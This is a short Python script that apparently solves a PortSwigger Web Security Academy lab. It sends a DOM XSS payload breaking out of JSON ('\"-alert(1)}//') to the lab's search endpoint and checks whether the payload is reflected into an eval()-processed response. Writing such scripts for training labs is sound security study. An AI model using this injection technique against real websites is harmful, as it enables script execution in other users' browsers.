#!/usr/bin/env python3

import requests

# PortSwigger Web Security Academy lab URL.
LAB_URL = "https://0aa0001703e22861807cc69c00e6006e.web-security-academy.net"

# DOM XSS payload.
payload = r"\"-alert(1)}//"

print("[*] Requesting search results with DOM XSS payload...\n")

response = requests.get(
    f"{LAB_URL}/search-results",
    params={"search": payload},
)

print("=" * 50)
print(f"Status : {response.status_code}")
print()

if response.status_code == 200:
    print("[+] Search results retrieved successfully.")

    if payload in response.text:
        print("[+] The payload is reflected in the JSON response.")
        print("[+] The application uses eval() to process this JSON.")
        print("[+] Opening the search page in a browser will trigger the DOM XSS.")
    else:
        print("[-] The payload was not reflected in the response.")
else:
    print("[-] Failed to retrieve the search results.")
